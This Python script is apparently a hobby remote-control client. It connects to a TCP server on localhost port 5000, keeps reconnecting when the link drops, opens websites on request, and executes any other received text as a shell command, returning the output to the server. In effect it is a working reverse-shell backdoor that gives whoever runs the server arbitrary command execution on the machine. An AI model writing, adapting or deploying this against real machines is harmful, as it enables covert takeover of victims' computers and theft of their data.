import socket
import webbrowser as wb
import os
import subprocess
import time   # 🔥 add

HOST = '127.0.0.1'
PORT = 5000

# 🔥 reconnect loop
while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        break
    except:
        print("Server not available, retrying...")
        time.sleep(2)

print("Connected to server!")

def send_to_server(msg):
    client.send(msg.encode())

while True:
    try:
        data = client.recv(1024).decode()
    except:
        print("Server disconnected. Reconnecting...")
        client.close()
        time.sleep(2)

        # 🔥 reconnect again
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((HOST, PORT))
                print("Reconnected!")
                break
            except:
                time.sleep(2)
        continue

    if not data:
        continue

    print(f"Server: {data}")

    if data.startswith("open "):
        try:
            app = data.replace("open ", "").strip()
            wb.open(f"https://{app}.com")
        except:
            send_to_server("wrong domain name")
    elif data.lower() == "exit":
        break

    else:
        try:
            data = subprocess.check_output(f"{data}", shell=True).decode()
            send_to_server(data)
        except:
           send_to_server("The Command Is Wrong Please Check The Command That You Entered")

client.close()